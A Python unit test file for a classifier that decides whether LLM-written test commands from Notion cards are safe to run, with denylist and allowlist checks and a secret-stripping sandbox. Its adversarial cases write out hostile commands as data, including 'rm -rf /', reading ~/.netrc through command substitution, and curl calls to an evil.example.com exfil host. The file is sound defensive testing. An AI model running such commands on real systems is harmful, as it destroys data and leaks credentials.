"""The safety model for executing Notion-authored Test Commands, pinned.

`check_queue_health.py --execute` runs strings that an LLM wrote into a Notion field. Every one
is hostile-by-accident. `classify_command` is the whole safety model and it is PURE, so this
file can exercise every adversarial case without executing anything.

THE RULE BEING IMPLEMENTED. A card's Test Command that PASSES on clean main means the card's
work already exists — true of a bug fix and a feature alike. Measured 2026-08-23, that rule
would have caught AIQ-1981 and AIQ-2117, both of which described work that had already shipped
and both of which cost a full agent pass to discover.

Offline. No network, no subprocess.
"""
from __future__ import annotations

import os
import sys
import unittest

_REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
for _p in (_REPO_ROOT, os.path.join(_REPO_ROOT, "scripts")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import check_queue_health as qh  # noqa: E402

V = qh.Verdict


class RealSampledCommandsClassifyCorrectly(unittest.TestCase):
    """Every form below was read off a live `Ready for AI` card on 2026-08-23."""

    RUNNABLE = [
        "cd backend && ./.venv311/bin/pytest tests/test_x.py",   # cd is refused; see below
        "pytest backend/tests/test_admin_requirement_review_lawyer_gate.py -q",
        "./.venv311/bin/python -m pytest backend/tests -q -k resources",
        "npx vitest run src/navigation/navigateTargets.test.ts",
        "test -f docs/decisions/x.md && grep -qE 'case_readiness' docs/decisions/x.md",
    ]

    def test_a_targeted_pytest_is_runnable(self):
        c = qh.classify_command("pytest backend/tests/test_x.py::test_y -q")
        self.assertIsNone(c.verdict, c.reason)

    def test_python_dash_m_pytest_is_runnable(self):
        c = qh.classify_command("./.venv311/bin/python -m pytest backend/tests -q -k resources")
        self.assertIsNone(c.verdict, c.reason)

    def test_npx_vitest_with_a_file_is_runnable(self):
        c = qh.classify_command("npx vitest run src/navigation/navigateTargets.test.ts")
        self.assertIsNone(c.verdict, c.reason)

    def test_a_file_assertion_chain_splits_into_two_segments(self):
        c = qh.classify_command("test -f docs/x.md && grep -q 'RECOMMENDED' docs/x.md")
        self.assertIsNone(c.verdict, c.reason)
        self.assertEqual(len(c.segments), 2)

    def test_a_public_get_is_interpreted_not_executed(self):
        c = qh.classify_command(
            "curl -s 'https://api.relopass.com/api/public/corridor-requirements?from=ES&to=IE'")
        self.assertIsNone(c.verdict, c.reason)
        self.assertEqual(c.kind, "http_get")
        self.assertTrue(c.normalizations, "the curl substitution must be reported, not silent")


class ProseAndPlaceholdersAreNotCommands(unittest.TestCase):
    def test_prose_is_refused_by_the_head_allowlist(self):
        """No separate NLP detector — the allowlist already answers this."""
        c = qh.classify_command("Inspect the 'Detect changes' job log on an oversized PR")
        self.assertIs(c.verdict, V.REFUSED)
        self.assertIn("head-not-allowlisted", c.reason)

    def test_explicit_na_is_unparseable(self):
        self.assertIs(qh.classify_command("N/A (research) — validation is the artifact").verdict,
                      V.UNPARSEABLE)

    def test_a_placeholder_is_unparseable_not_refused(self):
        """Distinct outcomes: this card COULD be checkable once someone fills the value in."""
        c = qh.classify_command("python scripts/import_otto_facts.py <batch-id>")
        self.assertIs(c.verdict, V.UNPARSEABLE)
        self.assertIn("placeholder", c.reason)

    def test_an_env_placeholder_is_unparseable(self):
        self.assertIs(qh.classify_command("DATABASE_URL=${DB} pytest x.py").verdict,
                      V.UNPARSEABLE)


class NonDiscriminatingCommandsAreNotStale(unittest.TestCase):
    """Without this class, ~a third of the queue is flagged 'already shipped' on day one."""

    def test_bare_tsc_is_non_discriminating(self):
        c = qh.classify_command("npx tsc --noEmit")
        self.assertIs(c.verdict, V.NON_DISCRIMINATING)

    def test_bare_pytest_is_non_discriminating(self):
        self.assertIs(qh.classify_command("pytest").verdict, V.NON_DISCRIMINATING)

    def test_pytest_with_a_k_selector_IS_discriminating(self):
        self.assertIsNone(qh.classify_command("pytest -k funding_source").verdict)


class AdversarialCommandsAreAllRefused(unittest.TestCase):
    """Each of these must be refused. A regression here is a remote-code-execution bug."""

    CASES = [
        ("pytest; rm -rf /", "chain"),
        ("pytest && curl https://evil.example.com/x", "host"),
        ("pytest `whoami`", "substitution"),
        ("pytest $(cat ~/.netrc)", "substitution"),
        ("npm run promote -- --apply", "npm"),
        ("python scripts/import_otto_facts.py IE-batch --apply", "write-intent"),
        ("./.venv311/bin/python scripts/x.py --promote", "write-intent"),
        ("curl -X POST https://api.relopass.com/api/companies -d '{}'", "flag"),
        ("curl -k -H 'Authorization: Bearer abc' https://api.relopass.com/x", "auth"),
        ("git push origin main", "read-only"),
        ("pytest > /dev/null", "redirect"),
        ("bash -c 'pytest'", "write-capable"),
        ("sudo pytest", "write-capable"),
        ("psql $DATABASE_URL -c 'select 1'", "substitution"),
        ("DATABASE_URL=postgres://u:p@h/db pytest x.py", "credential"),
        ("rm -rf backend && pytest", "write-capable"),
        ("pytest | tee out.txt", "chain"),
    ]

    def test_every_adversarial_form_is_refused(self):
        for cmd, hint in self.CASES:
            with self.subTest(cmd=cmd):
                c = qh.classify_command(cmd)
                self.assertIn(c.verdict, (V.REFUSED, V.UNPARSEABLE),
                              f"{cmd!r} was NOT refused (reason={c.reason!r})")

    def test_a_denied_binary_inside_a_chain_still_refuses(self):
        """The second segment must be judged as strictly as the first."""
        c = qh.classify_command("test -f x.md && rm x.md")
        self.assertIs(c.verdict, V.REFUSED)


class EachDefenceLayerIsPinnedIndEPENDENTLY(unittest.TestCase):
    """The layers are redundant on purpose; that must not mean none of them is tested.

    Mutation-testing the end-to-end corpus showed the problem: disabling the DENYLIST entirely
    left all 31 tests green, because `npm`/`sudo`/`rm` also fail the head allowlist, and the
    chain check catches the rest. Same in reverse. Defence in depth is correct design, but it
    means an end-to-end corpus cannot tell you a layer has been removed — every case is caught
    by some other layer, right up until the day two are removed together.

    These call each layer directly so a regression in ONE is visible.
    """

    def test_denylist_alone_rejects_write_intent(self):
        self.assertIn("write-intent", qh._denylist_reason(("pytest", "--apply")))
        self.assertIn("write-intent", qh._denylist_reason(("pytest", "--promote")))

    def test_denylist_alone_rejects_write_capable_binaries(self):
        for binary in ("rm", "psql", "supabase", "npm", "bash", "sudo", "docker"):
            with self.subTest(binary=binary):
                self.assertIn("write-capable", qh._denylist_reason((binary, "x")))

    def test_denylist_alone_rejects_a_credential_env_prefix(self):
        self.assertIn("credential",
                      qh._denylist_reason(("DATABASE_URL=postgres://x", "pytest")))
        self.assertIn("credential",
                      qh._denylist_reason(("SUPABASE_SERVICE_ROLE_KEY=x", "pytest")))

    def test_denylist_passes_a_clean_command(self):
        self.assertEqual(qh._denylist_reason(("pytest", "backend/tests/x.py")), "")

    def test_head_allowlist_alone_rejects_prose_and_unknown_binaries(self):
        self.assertIn("head-not-allowlisted", qh._head_allowlist_reason(("Inspect", "the")))
        self.assertIn("head-not-allowlisted", qh._head_allowlist_reason(("wget", "url")))

    def test_head_allowlist_alone_constrains_python_npx_and_git(self):
        self.assertNotEqual(qh._head_allowlist_reason(("python", "scripts/x.py")), "")
        self.assertEqual(qh._head_allowlist_reason(("python", "-m", "pytest")), "")
        self.assertNotEqual(qh._head_allowlist_reason(("npx", "ts-node", "x.ts")), "")
        self.assertNotEqual(qh._head_allowlist_reason(("git", "push")), "")
        self.assertEqual(qh._head_allowlist_reason(("git", "ls-files")), "")

    def test_curl_host_allowlist_alone_rejects_a_foreign_host(self):
        """The case the end-to-end corpus was missing: a LONE curl to an arbitrary host."""
        url, refusal = qh._curl_to_get(("curl", "-s", "https://evil.example.com/exfil"))
        self.assertIsNone(url)
        self.assertIn("not allowlisted", refusal)

    def test_a_lone_curl_to_a_foreign_host_is_refused_end_to_end(self):
        c = qh.classify_command("curl -s https://evil.example.com/exfil")
        self.assertIs(c.verdict, V.REFUSED)

    def test_curl_flag_allowlist_alone_rejects_a_write_verb(self):
        _, refusal = qh._curl_to_get(("curl", "-X", "POST", "https://api.relopass.com/x"))
        self.assertIn("not on the GET allowlist", refusal)

    def test_curl_allowlist_accepts_the_real_sampled_form(self):
        url, refusal = qh._curl_to_get(
            ("curl", "-s", "--max-time", "45", "https://api.relopass.com/api/health"))
        self.assertEqual(refusal, "")
        self.assertEqual(url, "https://api.relopass.com/api/health")


class TheCorpusIsNotDegenerate(unittest.TestCase):
    """Stops someone emptying the allowlist to silence a flake and leaving this green.

    If every command classified REFUSED, all the tests above that assert refusal would still
    pass. This asserts the corpus exercises each verdict class, so a blanket-refuse
    implementation fails here.
    """

    def test_every_verdict_class_is_represented(self):
        seen = set()
        samples = ["pytest backend/tests/test_x.py", "npx tsc --noEmit",
                   "Inspect the job log", "N/A (research)",
                   "curl -s https://api.relopass.com/health"]
        for cmd in samples:
            c = qh.classify_command(cmd)
            seen.add(c.verdict.value if c.verdict else "runnable")
        for expected in ("runnable", V.NON_DISCRIMINATING.value, V.REFUSED.value,
                         V.UNPARSEABLE.value):
            self.assertIn(expected, seen, f"corpus no longer exercises {expected}")


class TheSandboxWithholdsSecrets(unittest.TestCase):
    def test_no_real_credential_reaches_a_command(self):
        os.environ["SUPABASE_SERVICE_ROLE_KEY"] = "should-not-leak"
        os.environ["ANTHROPIC_API_KEY"] = "should-not-leak"
        try:
            env = qh.sandbox_env()
            for banned in ("SUPABASE_SERVICE_ROLE_KEY", "ANTHROPIC_API_KEY", "NOTION_TOKEN",
                           "NOTION_QUEUE_TOKEN", "GITHUB_TOKEN", "GH_PAT", "CRON_SECRET"):
                self.assertNotIn(banned, env, f"{banned} leaked into the sandbox")
            self.assertTrue(env["DATABASE_URL"].startswith("sqlite:"),
                            "DATABASE_URL must point at a throwaway sqlite file, never prod")
        finally:
            os.environ.pop("SUPABASE_SERVICE_ROLE_KEY", None)
            os.environ.pop("ANTHROPIC_API_KEY", None)


class TrailerParsing(unittest.TestCase):
    def test_a_complete_trailer_parses(self):
        t = qh.parse_trailer("...\nPREMISE: Refuted   DUPLICATE: yes   OUTCOME: no-op")
        self.assertEqual((t.premise, t.duplicate, t.outcome), ("Refuted", True, "no-op"))
        self.assertTrue(t.complete)

    def test_a_partial_trailer_still_yields_its_datum(self):
        """A strict conjunctive regex would undercount compliance."""
        t = qh.parse_trailer("PREMISE: Confirmed")
        self.assertEqual(t.premise, "Confirmed")
        self.assertFalse(t.complete)

    def test_the_last_trailer_wins(self):
        """Notes are appended to over a card's life; the final verdict is the real one."""
        t = qh.parse_trailer("PREMISE: Confirmed\n...later...\nPREMISE: Refuted")
        self.assertEqual(t.premise, "Refuted")

    def test_notes_without_a_trailer_return_none(self):
        self.assertIsNone(qh.parse_trailer("## What was built\nsome prose"))

    def test_the_proposed_source_token_is_picked_up_for_free(self):
        """Attribution needs no schema change — one extra token on the existing line."""
        t = qh.parse_trailer("PREMISE: Refuted DUPLICATE: no OUTCOME: no-op SOURCE: bug-triage")
        self.assertEqual(t.source, "bug-triage")


class ADegenerateScanIsNotAPass(unittest.TestCase):
    def _rows(self, n, **over):
        base = dict(aiq="AIQ-1", url="", title="t", status="Done", dor=qh.VETTED,
                    task_type="Bug Fix", product_area="", agent="", tier="",
                    test_command="", failure_evidence="", notes="", dependencies="",
                    last_edited="2026-08-01T00:00:00.000Z")
        base.update(over)
        return [qh.Row(**base) for _ in range(n)]

    def test_too_few_rows_raises(self):
        with self.assertRaises(qh.QueueUnavailable):
            qh.assert_non_degenerate(self._rows(10))

    def test_no_titles_raises_and_names_fable(self):
        with self.assertRaises(qh.QueueUnavailable) as ctx:
            qh.assert_non_degenerate(self._rows(2000, title=""))
        self.assertIn("fable", ctx.exception.detail)

    def test_a_normalized_em_dash_raises(self):
        """`Vetted - ready` with a hyphen matches zero rows and reports 0 violations."""
        with self.assertRaises(qh.QueueUnavailable) as ctx:
            qh.assert_non_degenerate(self._rows(2000, dor="Vetted - ready"))
        self.assertIn("em-dash", ctx.exception.detail)

    def test_a_healthy_scan_passes(self):
        qh.assert_non_degenerate(self._rows(2000))


class IncidentRegressionFixtures(unittest.TestCase):
    """Named after the real failures, so the link survives."""

    def _row(self, **over):
        base = dict(aiq="AIQ-0", url="", title="t", status="Ready for AI", dor=qh.VETTED,
                    task_type="Bug Fix", product_area="", agent="Claude Code", tier="🟡",
                    test_command="", failure_evidence="x", notes="", dependencies="",
                    last_edited="2026-08-20T00:00:00.000Z")
        base.update(over)
        return qh.Row(**base)

    def test_aiq_1981_style_card_is_classified_runnable(self):
        """Its work shipped under an untagged commit; only running the command finds that."""
        row = self._row(aiq="AIQ-1981",
                        test_command="pytest backend/tests/test_nonobvious_recall_metrics.py -q")
        self.assertIsNone(qh.classify_command(row.test_command).verdict)

    def test_aiq_1999_style_card_is_caught_by_status_divergence(self):
        rows = [self._row(aiq="AIQ-1999", notes="## BLOCKED ON AIQ-2135 — who pays\nmore")]
        res = qh.check_status_divergence(rows)
        self.assertEqual(len(res.findings), 1)
        self.assertIn("Blocked", res.findings[0]["reason"])

    def test_a_card_whose_notes_say_already_shipped_is_caught(self):
        rows = [self._row(aiq="AIQ-2117", notes="This is already shipped, routed and flag-on.")]
        res = qh.check_status_divergence(rows)
        self.assertEqual(len(res.findings), 1)

    def test_vetted_with_neither_evidence_nor_test_is_flagged(self):
        rows = [self._row(aiq="AIQ-X", failure_evidence="  ", test_command="")]
        self.assertEqual(len(qh.check_vetted_no_verification(rows).findings), 1)

    def test_vetted_with_a_test_command_is_not_flagged(self):
        rows = [self._row(aiq="AIQ-Y", failure_evidence="", test_command="pytest x.py")]
        self.assertEqual(qh.check_vetted_no_verification(rows).findings, [])

    def test_a_to_do_card_with_nothing_is_noise(self):
        rows = [self._row(aiq="AIQ-1908", status="To Do", dor="", tier="",
                          failure_evidence="", test_command="")]
        self.assertEqual(len(qh.check_unvetted_noise(rows).findings), 1)


if __name__ == "__main__":
    unittest.main()
